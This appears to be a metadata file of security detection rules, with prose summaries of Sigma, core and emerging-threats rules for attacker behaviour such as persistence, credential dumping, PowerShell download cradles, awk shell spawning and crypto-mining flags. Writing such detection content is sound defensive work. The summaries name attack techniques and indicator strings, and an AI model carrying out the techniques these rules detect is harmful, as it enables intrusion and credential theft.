8c15dd74-9570-4f48-80b2-29996fd91ee6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 754e432803bcef868648053b47c04beb
  Ruleset: emerging-threats
  Summary: This rule detects the creation of a persistence mechanism by the Goofy
    Guineapig backdoor through the registration of a new service. It highlights specific
    events where the Service Control Manager logs the creation of a service named
    'GoogleUpdate', which employs 'rundll32' and 'FileProtocolHandler' to execute
    'GoogleUpdate.exe' from the ProgramData directory. The Goofy Guineapig backdoor
    uses this method to maintain persistence on Windows systems.
  Updated-Date: '2024_09_03'
8c1a5675-cb85-452f-a298-b01b22a51856:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9eed8d4796cbfb3ba1c7537607c74a5a
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "awk" command or its variants (gawk,
    mawk, nawk) invoking a shell using the system() function on a Linux system. This
    behavior is often associated with attempts to execute arbitrary commands or escalate
    privileges, which can potentially lead to unauthorized access or further exploitation.
  Updated-Date: '2024_09_04'
8c31f563-f9a7-450c-bfa8-35f8f32f1f61:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9565ae24e1802a0f1fb15ba995911824
  Ruleset: sigmahq
  Summary: This rule detects the creation of a macro file specifically for Microsoft
    Outlook. This is identified by monitoring for instances where the Outlook executable
    file (\outlook.exe) creates or modifies a file named VbaProject.OTM under the
    directory path \Microsoft\Outlook. This activity can be indicative of persistence
    or command-and-control tactics within a system, as described in related cybersecurity
    frameworks. However, it is worth noting that legitimate creation of VB macros
    for email purposes by users can also trigger this detection.
  Updated-Date: '2024_09_04'
8c3c76ca-8f8b-4b1d-aaf3-81aebcd367c9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dc4750eedfa21923ecdcac7f76df70ad
  Ruleset: core
  Summary: This rule detects attempts by adversaries to hijack vulnerable file path
    references by creating an executable named "program.exe" in a higher-level directory
    of an unquoted service path in Windows. This tactic exploits paths that lack surrounding
    quotations, potentially causing the operating system to execute the adversary's
    malicious executable instead of the intended one.
  Updated-Date: '2024_09_03'
8c521530-5169-495d-a199-0a3a881ad24e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 67f0c8b267cf4f67f4842ebb52626c61
  Ruleset: core
  Summary: This rule detects the use of PowerShell to write data into NTFS alternate
    data streams, which is identified through the presence of specific commands such
    as "set-content" and "add-content" in the Script Block Text. This activity can
    be indicative of defense evasion tactics or unauthorized data storage methods
    on Windows systems. Script Block Logging must be enabled to capture and analyze
    these events.
  Updated-Date: '2024_09_03'
8c6ec464-4ae4-43ac-936a-291da66ed13d:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 66d9947744156b7aa2e0c1641dc5d8e1
  Ruleset: core
  Summary: This rule detects when a user assigned a privileged role in Azure is not
    actively using that role.
  Updated-Date: '2024_09_03'
8c7090c3-e0a0-4944-bd08-08c3a0cecf79:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f0c8a804311758785077b81b132d9816
  Ruleset: emerging-threats
  Summary: This rule detects activity related to the TropicTrooper campaign, known
    for targeting high-profile organizations in the energy and food and beverage sectors
    in Asia. It identifies specific command line behavior that may indicate an attack
    associated with TropicTrooper.
  Updated-Date: '2024_09_03'
8c944ecb-6970-4541-8496-be554b8e2846:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5e3de6328fecf95a571e074e91795f47
  Ruleset: sigmahq
  Summary: This rule detects successful authentications from countries where your
    organization does not have operations. It monitors Azure sign-in logs for successful
    login attempts and filters out locations where operations are expected, flagging
    any unexpected countries. This helps identify unauthorized access or potentially
    compromised accounts, particularly in the initial access and credential access
    stages of an attack.
  Updated-Date: '2024_09_04'
8ca7004b-e620-4ecb-870e-86129b5b8e75:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2840587f5bb3b10e575e687b73ec9618
  Ruleset: core
  Summary: This rule detects the obfuscated use of environment variables to execute
    PowerShell commands on a Windows system. It monitors the 'Service Control Manager'
    for event ID 7045, which is logged when a service is installed on the system.
    The detection specifically looks for instances where the 'cmd' command interpreter
    is used with the '/c' or '/r' switch, which allows for the execution of commands,
    followed by an obfuscated 'set' command and formatted text with the '-f' switch.
    This pattern indicates potential misuse for executing PowerShell commands in a
    way that can evade standard defenses.
  Updated-Date: '2024_09_03'
8cbc9475-8d05-4e27-9c32-df960716c701:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e2f479cb60d11a05626e85f5e4731b67
  Ruleset: sigmahq
  Summary: This rule detects the execution of "reg.exe" to modify registry keys related
    to the user's desktop background settings. This behavior is often employed by
    malware to change the desktop background to display a ransom note or another image,
    a tactic frequently associated with ransomware attacks. Specific command line
    instructions are monitored, such as those preventing the desktop background from
    being changed or setting a new wallpaper with specific styles. Legitimate administrative
    scripts that change desktop backgrounds to a company logo or other images may
    trigger false positives.
  Updated-Date: '2024_09_04'
8ccd35a2-1c7c-468b-b568-ac6cdf80eec3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3c648e9f9b6703ab398c29327c316670
  Ruleset: core
  Summary: This rule detects the usage of Bitsadmin for connecting to IP addresses,
    rather than fully qualified domain names (FQDN). Bitsadmin, a command-line tool
    in Microsoft Windows, is employed for creating, downloading, or monitoring file
    transfer jobs. The detection focuses on identifying when the user agent starts
    with "Microsoft BITS/" and the destination host ends in a numeric character, indicating
    a possible unconventional or suspicious server connection that could be linked
    to command-and-control activities, defense evasion, or persistence mechanisms
    utilized by attackers.
  Updated-Date: '2024_09_03'
8cd538a4-62d5-4e83-810b-12d41e428d6e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e27c73cae25db9a65e6149e649e3bc1d
  Ruleset: sigmahq
  Summary: This rule detects potential adversaries accessing the microphone and webcam
    on an endpoint device. It monitors specific Windows security event IDs (4657,
    4656, and 4663) and looks for access to registry keys associated with the consent
    store for microphone and webcam capabilities. The activity may indicate unauthorized
    attempts to use these components, pointing to potential privacy invasions or malicious
    surveillance.
  Updated-Date: '2024_09_04'
8cde342c-ba48-4b74-b615-172c330f2e93:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d88fcb69cdf4bb26babe882e8b1e0b94
  Ruleset: core
  Summary: This rule detects the use of rundll32.exe to load a renamed comsvcs.dll,
    which is an indication that a process memory dump is being attempted. Specifically,
    it looks for instances where rundll32.exe loads a DLL that matches certain predetermined
    hashes, corresponding to various versions of Windows. This behavior is associated
    with credential access and defense evasion tactics commonly utilized by malicious
    actors. Detection focuses on monitoring the image load events, ensuring that legitimate
    uses of comsvcs.dll are excluded to minimize false positives.
  Updated-Date: '2024_09_03'
8d01b53f-456f-48ee-90f6-bc28e67d4e35:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cd1baee1c70f6bab475c0b76d757aaf2
  Ruleset: core
  Summary: This rule detects suspicious obfuscated PowerShell code that is often encoded
    in UTF16 and base64, commonly used in command lines for malicious purposes. The
    detection focuses on specific encoded strings and patterns that indicate the presence
    of obfuscated commands. This type of obfuscation is frequently associated with
    tactics aimed at evading defense mechanisms within Windows environments.
  Updated-Date: '2024_09_03'
8d31a8ce-46b5-4dd6-bdc3-680931f1db86:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 95d9ad7ea6faa3f9944b2c3382d58878
  Ruleset: core
  Summary: This rule detects trivial artifacts in offensive PowerShell payloads used
    by various malicious tools and frameworks, such as Cobalt Strike Beacon, PoshC2,
    Powerview, Letmein, Empire, and Powersploit. These artifacts often go through
    minimal changes due to poor operational security by attackers. The detection is
    based on specific script components that are commonly observed in these tools,
    including terms like '$DoIt', 'harmj0y', 'mattifestation', '_RastaMouse', 'tifkin_',
    and '0xdeadbeef'. The rule is designed to identify these recognizable patterns
    within the PowerShell module logs on Windows systems.
  Updated-Date: '2024_09_03'
8d5aca11-22b3-4f22-b7ba-90e60533e1fb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dc6909d2519b76301ec0cf686d5aa6e1
  Ruleset: core
  Summary: 'This rule detects the creation of default output filenames used by the
    wmiexec tool. Wmiexec is part of the Impacket suite used for executing commands
    on remote systems via WMI (Windows Management Instrumentation). The rule identifies
    the specific filename patterns generated by wmiexec in typical Windows directories
    such as the root of C: or D: drives, or within the Windows directory. This behavior
    is associated with lateral movement and can indicate unauthorized use of administrative
    tools in a network.'
  Updated-Date: '2024_09_03'
8d63dadf-b91b-4187-87b6-34a1114577ea:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c9134c5b0c7978a409c7d687278b1f19
  Ruleset: sigmahq
  Summary: This rule detects potential SquiblyTwo attack techniques, which involve
    the possible use of renamed WMIC (Windows Management Instrumentation Command)
    tools to bypass security measures. The detection focuses on identifying specific
    image paths ending with '\wmic.exe' and verifying the original filename as 'wmic.exe'.
    Additionally, it checks for certain imphash values and command lines containing
    both 'format:' and 'http', indicating abnormal or malicious utilization of WMIC
    for execution.
  Updated-Date: '2024_09_04'
8d7e392e-9b28-49e1-831d-5949c6281228:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 25ef44ac09f3dff3c0c7aaaf3cb5079d
  Ruleset: core
  Summary: This rule detects a network connection initiated by IMEWDBLD.EXE, which
    might suggest potential misuse of this utility as a living-off-the-land binary
    (LOLBIN) to download arbitrary files or additional payloads. IMEWDBLD.EXE, typically
    a legitimate tool, could be exploited by attackers to facilitate command and control
    operations or to introduce malicious software into a system.
  Updated-Date: '2024_09_03'
8d85cf08-bf97-4260-ba49-986a2a65129c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 57d96fe3d52f8f7a1f3d2bd2428eb320
  Ruleset: sigmahq
  Summary: This rule detects potential PowerShell commands or code within registry
    run keys on Windows systems. It focuses on identifying suspicious PowerShell invocations
    within specific registry locations, particularly those that can indicate persistence
    mechanisms. The rule looks for strings such as 'powershell', 'pwsh', 'FromBase64String',
    and other common PowerShell command parameters that can be used to download files,
    execute hidden scripts, or bypass execution policies. This detection helps in
    identifying malicious activities like malware execution or unauthorized administrative
    scripting that leverage PowerShell within Windows registry run keys to maintain
    persistence.
  Updated-Date: '2024_09_04'
8de1cbe8-d6f5-496d-8237-5f44a721c7a0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bd0a3f7b66bb6971f13f7574283d15c5
  Ruleset: sigmahq
  Summary: This rule detects the execution of whoami.exe with suspicious parent processes.
    Whoami.exe is a utility in Windows used to display user, group, and privileges
    information for the user currently logged on. The detection focuses on identifying
    instances where whoami.exe is started by uncommon parent processes that may indicate
    malicious activity, such as unusual administrative scripts or the behavior of
    keyloggers like Agent Tesla. Typical legitimate parent processes include cmd.exe
    and powershell.exe, among others. False positives may occur from legitimate administrative
    activity or monitoring tools.
  Updated-Date: '2024_09_04'
8de89e52-f6e1-4b5b-afd1-41ecfa300d48:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4578a36d31bd8acfc6a14a36032ebb57
  Ruleset: sigmahq
  Summary: This rule detects suspicious child processes spawned by the Windows Terminal
    application, a potential indicator of persistence mechanisms. It identifies specific
    processes like `rundll32.exe`, `regsvr32.exe`, and `certutil.exe`, which are often
    associated with living-off-the-land binaries (LOLBINS). Additionally, it flags
    processes launched from suspicious directories such as the Public folder or temporary
    directories. Command lines containing suspicious keywords or commands commonly
    used in scripting and downloading malicious content are also monitored. Legitimate
    development environment commands and settings update commands are excluded to
    minimize false positives.
  Updated-Date: '2024_09_04'
8dee7a0d-43fd-4b3c-8cd1-605e189d195e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4602528326f8e15d7237e27ab049515c
  Ruleset: sigmahq
  Summary: This rule detects the change of a user's type from "Guest" to "Member"
    in Azure audit logs, which may indicate an elevation of privilege. The detection
    focuses on 'UserManagement' category activities, specifically the 'Update user'
    operation where the 'UserType' attribute is changed from 'Guest' to 'Member'.
    This type of change can be associated with potential privilege escalation or initial
    access attempts.
  Updated-Date: '2024_09_04'
8e0bb260-d4b2-4fff-bb8d-3f82118e6892:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fe337e29c7db0c40e961bc42091edff6
  Ruleset: sigmahq
  Summary: This rule detects inline Windows command shell (CMD) operations that redirect
    outputs using the ">" symbol to locations deemed suspicious. Such redirections
    could be exploited by attackers to save results of reconnaissance commands like
    "hostname" and "dir" into files for future data exfiltration. Specifically, it
    focuses on commands that redirect output to directories associated with user data
    and system temporary files, such as `%APPDATA%`, `%TEMP%`, `%USERPROFILE%`, `C:\Temp`,
    and `C:\Windows\Temp`. The rule takes into account potential variations in command
    syntax that might be used to bypass detection. It is aimed at identifying scenarios
    where output redirection may indicate malicious activity while acknowledging that
    legitimate administrative or third-party scripts might also demonstrate similar
    behavior, leading to possible false positives.
  Updated-Date: '2024_09_04'
8e1cb247-6cf6-42fa-b440-3f27d57e9936:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5855f201ee20c4fb9a2b97f6543e8353
  Ruleset: core
  Summary: This rule detects potential persistence activity via Microsoft Office startup
    add-ins, specifically focusing on .wll and .xll file extensions, which are sets
    of dynamically linked libraries (DLLs) for Word or Excel. The rule identifies
    suspicious file events where TargetFilenames indicate the placement of add-ins
    in specific startup directories for Word and Excel, such as "\Microsoft\Word\Startup\"
    and "\Microsoft\Excel\Startup\". It also checks for files ending in extensions
    like .wll, .xll, .xlam, .xla, or .ppam in directories associated with Microsoft
    Addins. While legitimate add-ins can trigger this alert, the detection aims to
    highlight potential misuse for persistent threats.
  Updated-Date: '2024_09_03'
8e3c7994-131e-4ba5-b6ea-804d49113a26:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 05a84b42809d17dd835bf0cb6bf3ce74
  Ruleset: sigmahq
  Summary: This rule detects an uncommon child process spawned by the "odbcconf.exe"
    binary, which typically should not generate any child processes. This behavior
    might indicate unauthorized activity or potential misuse for executing DLLs, relevant
    in the context of defense evasion techniques.
  Updated-Date: '2024_09_04'
8e4cf0e5-aa5d-4dc3-beff-dc26917744a9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9487ef72b4ea54a614b0413d478a4d91
  Ruleset: sigmahq
  Summary: This rule detects the installation of TAP drivers, which are well-known
    for their use in tunneling techniques and could potentially signify preparation
    for data exfiltration activities. The detection focuses on identifying events
    generated by the Service Control Manager in Windows, specifically Event ID 7045
    with an image path containing 'tap0901'.
  Updated-Date: '2024_09_04'
8e5c03fa-b7f0-11ea-b242-07e0576828d9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f975c9dc77963452b1f0524dfee006b6
  Ruleset: sigmahq
  Summary: This rule detects attempts by an authenticated user to connect to a computer
    via Remote Desktop when the user is not permitted to log on remotely. Such events
    can often indicate that attackers are probing for accessible Windows servers within
    a network. The detection is based on identifying EventID 4825 in Windows security
    logs.
  Updated-Date: '2024_09_04'
8ec2c8b4-557a-4121-b87c-5dfb3a602fae:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 48dfc41ea023f8cba412cb3c9ab39df6
  Ruleset: core
  Summary: This rule detects a suspicious command sequence associated with JexBoss,
    a tool often used to exploit and test JBoss application servers. The detection
    focuses on specific patterns in Linux command logs, such as the invocation of
    bash with additional parameters and references to TCP connections. These indicators
    suggest potential malicious activity, which is critical for identifying unauthorized
    access attempts or other exploitation behaviors related to JexBoss.
  Updated-Date: '2024_09_03'
8eef149c-bd26-49f2-9e5a-9b00e3af499b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 50f05d7da1e453eb92483c45568f6d43
  Ruleset: sigmahq
  Summary: This rule detects the "Pass the Hash" attack technique, which is used for
    lateral movement within a network. The detection focuses on Windows security logs
    and monitors event ID 4624 for specific logon types and logon process names, namely
    'NtLmSsp' and 'seclogo'. The rule filters out irrelevant events where the target
    username is 'ANONYMOUS LOGON', aiming to identify legitimate instances of this
    attack while minimizing false positives related to administrator activities.
  Updated-Date: '2024_09_04'
8f02c935-effe-45b3-8fc9-ef8696a9e41d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5ac2073c546ddea29ff2b847297209d1
  Ruleset: core
  Summary: This rule detects the usage of the 'reg' or 'Powershell' command by non-privileged
    users to modify service configurations in the Windows registry. It focuses on
    identifying commands that involve adding or setting properties within the 'ControlSet\Services'
    registry path, such as 'ImagePath', 'FailureCommand', or 'ServiceDLL'. This detection
    aims to identify potential unauthorized changes that might indicate an attempt
    at privilege escalation or defense evasion.
  Updated-Date: '2024_09_03'
8f0b1fb1-9bd4-4e74-8cdf-a8de4d2adfd0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a37a5439a35bf45cf3aa48400527a0ac
  Ruleset: core
  Summary: This rule detects the unusual deletion of files by the process dns.exe,
    which may indicate remote code execution or exploitation activities related to
    CVE-2020-1350 (SigRed). The focus is on monitoring for anomalies where dns.exe
    deletes files other than its typical dns.log, as this behavior could signify malicious
    actions.
  Updated-Date: '2024_09_03'
8f668cc4-c18e-45fe-ad00-624a981cf88a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6feab48add8762d62a4f5a01a55c32f8
  Ruleset: sigmahq
  Summary: This rule detects when an application Sign-On Policy in Okta is either
    modified or deleted. By monitoring specific event types related to sign-on updates
    and rule deletions, it identifies changes that may indicate potential security
    risks or administrative actions within the Okta environment.
  Updated-Date: '2024_09_04'
8f70ac5f-1f6f-4f8e-b454-db19561216c5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 021f81c783ba1cf757b3f6e007fb84c4
  Ruleset: core
  Summary: This rule detects the execution of a PowerShell command that involves the
    creation of a WebClient object and the invocation of the DownloadFile method within
    a single command line. This behavior is indicative of attempts to download files
    from the internet possibly for malicious purposes, such as the initial compromise
    or command-and-control communication. The detection focuses on monitoring process
    creation events in Windows where these specific terms appear together in the command
    line.
  Updated-Date: '2024_09_03'
8f88e3f6-2a49-48f5-a5c4-2f7eedf78710:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4b0057901e00102192e1d20b84d99904
  Ruleset: sigmahq
  Summary: This rule detects a Java process running with remote debugging enabled,
    specifically when configuration settings allow connections from non-localhost
    addresses. This could indicate a security risk, as it exposes the Java process
    to potential remote exploitation. The rule identifies Java processes by examining
    command lines that include "transport=dt_socket,address=" and references older
    JVM versions, while excluding cases where the address is set to "127.0.0.1" or
    "localhost".
  Updated-Date: '2024_09_04'
8fa65166-f463-4fd2-ad4f-1436133c52e1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f52f5b1f3165af5541a96a80fdd570e5
  Ruleset: emerging-threats
  Summary: This rule detects the presence of scheduled task names used by the Russian
    SVR's GraphicalProton backdoor on Windows systems. It identifies tasks by specific
    names that are known to be associated with SVR's persistence techniques. These
    task names include variations of Defender and Windows Update services, as well
    as tasks related to data integrity, application experience, IIS updates, speech
    model installations, error reporting, and the Windows filtering platform. The
    detection focuses on security log entries with specific Event IDs such as 4698,
    4699, and 4702. This rule aims to identify malicious scheduled tasks that SVR
    might use to maintain persistence on compromised systems.
  Updated-Date: '2024_09_03'
8fbe98a8-8f9d-44f8-aa71-8c572e29ef06:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7e848baeffcff6d78d8edf8d325957e0
  Ruleset: sigmahq
  Summary: This rule detects modifications to the "Default" value of the "MyComputer"
    registry key and its subkeys, which can be used to configure a custom binary to
    launch whenever related actions are executed. This technique can be indicative
    of persistence mechanisms employed by attackers.
  Updated-Date: '2024_09_04'
8fbf3271-1ef6-4e94-8210-03c2317947f6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cbe19692e372eaad3b5202537d06455d
  Ruleset: core
  Summary: This rule detects the creation of files with well-known filenames associated
    with credential dumping tools or files produced by them. Credential dumping tools
    are used by attackers to extract password hashes and other sensitive information
    from a compromised system. The rule looks for filenames containing or ending with
    specific strings such as '\fgdump-log', '\kirbi', '\pwdump', '\pwhashes', and
    other recognizable names like 'cachedump.exe', 'DumpExt.dll', 'procdump64.exe',
    and 'wceaux.dll'. This detection helps identify potential malicious activities
    related to credential access vectors.
  Updated-Date: '2024_09_03'
8fe1c584-ee61-444b-be21-e9054b229694:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 90d46555a4ee6df382654d9309e3e9b7
  Ruleset: emerging-threats
  Summary: This rule detects attempts to exploit the print spooler vulnerabilities
    identified as CVE-2021-1675 and CVE-2021-34527 by monitoring security logs for
    remote printer driver loads from a Detailed File Share. Specifically, it checks
    for EventID 5145 with the share name containing '\\\\\*\\IPC$', relative target
    name 'spoolss', access mask '0x3', and object type 'File', which are indicative
    of such exploitation attempts.
  Updated-Date: '2024_09_03'
8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 586d8db64e9d835cd531a0a1d045ad05
  Ruleset: core
  Summary: This rule detects suspicious PowerShell invocation command parameters that
    may indicate malicious activity. It focuses on several specific PowerShell behaviors,
    including base64 encoding, the use of `iex` (Invoke-Expression), encoded command
    execution bypassing execution policies, registry modifications to persist malicious
    code, and downloading files from the internet using `System.Net.WebClient`. The
    rule identifies these activities when they occur with specific flags and commands
    such as `-nop`, `-w`, `hidden`, `-noni`, `-ep`, and `-Enc`. It also monitors for
    attempts to add entries to the Windows registry's run key to achieve persistence.
    Additionally, it distinguishes benign activities related to legitimate software
    installation, like Chocolatey, to minimize false positives. This detection helps
    in identifying potential security breaches involving PowerShell usage on Windows
    systems.
  Updated-Date: '2024_09_03'
8ffc5407-52e3-478f-9596-0a7371eafe13:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ba149ccccf976dda9129f3fab322b78b
  Ruleset: core
  Summary: This rule detects attempts to disable Potentially Unwanted Application
    (PUA) protection in Windows Defender by monitoring changes in the Windows registry.
    Specifically, it looks for modifications to the registry key '\Policies\Microsoft\Windows
    Defender\PUAProtection' where the value is set to 'DWORD (0x00000000)', indicating
    that PUA protection has been turned off. This action falls under defense evasion
    techniques as it reduces the effectiveness of the security software.
  Updated-Date: '2024_09_03'
90217a70-13fc-48e4-b3db-0d836c5824ac:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4709dd98cce9528acc380fc1848d8878
  Ruleset: core
  Summary: This rule detects any Global Assembly Cache (GAC) DLL being loaded by Microsoft
    Office applications such as Excel, Publisher, OneNote, Outlook, PowerPoint, and
    Word. The detection focuses on instances where these Office applications load
    DLLs from the GAC_MSIL directory, which is indicative of certain execution methods
    employed by threats. While legitimate macro usage in these applications can trigger
    false positives, appropriate filtering tailored to the specific environment can
    mitigate these occurrences.
  Updated-Date: '2024_09_03'
902cedee-0398-4e3a-8183-6f3a89773a96:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 456b35d2372d6843ae6b517892135284
  Ruleset: sigmahq
  Summary: This rule detects the use of the PowerShell command Invoke-Item following
    the mounting of a disk image using Mount-DiskImage, which includes interaction
    with Get-Volume to access the drive letter. This behavior is indicative of adversaries
    leveraging container files like .iso or .vhd formats to execute malicious payloads
    that bypass Mark of the Web (MOTW) tagging. The rule aims to identify such activity
    which may be used for defense evasion.
  Updated-Date: '2024_09_04'
904e8e61-8edf-4350-b59c-b905fc8e810c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9213cbed311841670350769e49565ef7
  Ruleset: sigmahq
  Summary: This rule detects the use of a PowerShell script that calls "get-process"
    and pipes the output to a "where-object" filter to identify security solution
    processes. Adversaries may use this method to enumerate security software, configurations,
    and defensive tools installed on a system or within a cloud environment. This
    may include details on firewall rules, anti-virus programs, and other defensive
    measures. The detection looks for specific patterns in the script, such as the
    usage of "get-process" or "gps" with filtering criteria that match known security
    software names like Avira, CarbonBlack, Cylance, Defender, Kaspersky, Malware,
    Sentinel, Symantec, and Virus. Initial tuning might be necessary to minimize false
    positives and manage resource consumption.
  Updated-Date: '2024_09_04'
9058ca8b-f397-4fd1-a9fa-2b7aad4d6309:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d91dc9b4cfaaf6738914d899d194048a
  Ruleset: sigmahq
  Summary: This rule detects attempts to access Okta administrative functions through
    a proxy. It identifies specific URI requests related to administrative actions
    and checks if these requests are made via a proxy server. This could indicate
    potential unauthorized access attempts or misuse, and additional scrutiny or filtering
    may be needed to rule out legitimate administrative actions performed through
    a proxy.
  Updated-Date: '2024_09_04'
9069ea3c-b213-4c52-be13-86506a227ab1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6da9171cb0397f2a4e07c94759ffab85
  Ruleset: core
  Summary: This rule detects command line parameters or strings commonly associated
    with crypto mining activities on Linux systems. It identifies indicators such
    as specific flags and options used in mining software, like `--cpu-priority=`,
    `--donate-level=0`, `-o pool.`, and `--nicehash`. It also looks for algorithm
    specifications like `--algo=rx/0` and network protocols such as `stratum+tcp://`
    and `stratum+udp://`. Additionally, it includes encoded strings that represent
    these parameters and protocols. The detection focuses on processes initiated on
    Linux, especially those potentially related to the Monero mining software xmrig.
  Updated-Date: '2024_09_03'
9082ff1f-88ab-4678-a3cc-5bcff99fc74d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6aa9e69f0770f2b5354a085bbd45300a
  Ruleset: core
  Summary: This rule detects the execution of the GMER Rootkit Detector and Remover
    tool on Windows systems by identifying its specific executable image ('gmer.exe')
    and associated hash values (MD5, SHA1, SHA256). GMER is a software utility used
    to scan and remove rootkits, which are malicious programs designed to conceal
    the presence of malware by modifying the host operating system. The rule is triggered
    by any process creation event in which the image path or hash matches known identifiers
    associated with GMER.
  Updated-Date: '2024_09_03'
908655e0-25cf-4ae1-b775-1c8ce9cf43d8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c2d4d3015d6652f8fca51267e9abac24
  Ruleset: sigmahq
  Summary: This rule detects failed attempts to sign in to disabled user accounts
    within Azure, specifically flagged by the error code ResultType 50057 and the
    description indicating that the account has been disabled by an administrator.
    This helps identify potential unauthorized access attempts or misuse of privileged
    accounts that have been intentionally disabled.
  Updated-Date: '2024_09_04'
90ae0469-0cee-4509-b67f-e5efcef040f7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7159a24b731650d3834e8032fd767dd0
  Ruleset: core
  Summary: This rule detects potential Dynamic Link Library (DLL) sideloading activity
    via the Aruba Networks Virtual Intranet Access "arubanetsvc.exe" process using
    DLL Search Order Hijacking. It identifies instances where specific DLLs, such
    as "wtsapi32.dll" or "dbghelp.dll," are loaded by "arubanetsvc.exe," except when
    these DLLs are located within standard Windows system directories (e.g., "C:\Windows\System32\").
    Such activity may indicate privilege escalation or persistence techniques commonly
    associated with malicious behavior.
  Updated-Date: '2024_09_03'
90d50722-0483-4065-8e35-57efaadd354d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7baef9f1a37dd550dcd03d070b1b3abc
  Ruleset: sigmahq
  Summary: This rule detects a specific combination of command line flags used by
    "devinit.exe," which can be exploited as a Living-Off-The-Land Binary (LOLBIN)
    to download arbitrary MSI packages on a Windows system.
  Updated-Date: '2024_09_04'
90d6bd71-dffb-4989-8d86-a827fedd6624:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e550af89db9d366e62dc2ca8af4ded73
  Ruleset: sigmahq
  Summary: This rule detects the execution of Visual Studio Code tunnel functionality,
    which attackers may misuse to establish a command and control (C2) channel. It
    identifies instances where the command line ends with ".exe tunnel", includes
    specific arguments such as "--name" and "--accept-server-license-terms", and scenarios
    where the parent command line ends with " tunnel" involving "cmd.exe" and related
    Visual Studio Code server scripts. Possible legitimate use of Visual Studio Code
    tunnel can trigger false positives.
  Updated-Date: '2024_09_04'
90dcf730-1b71-4ae7-9ffc-6fcf62bd0132:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8948014ca825ed32e7c46a8e8c664fea
  Ruleset: sigmahq
  Summary: This rule detects the execution of ZipExec, a Proof-of-Concept (POC) tool
    designed to enclose binary-based tools within a password-protected zip file. The
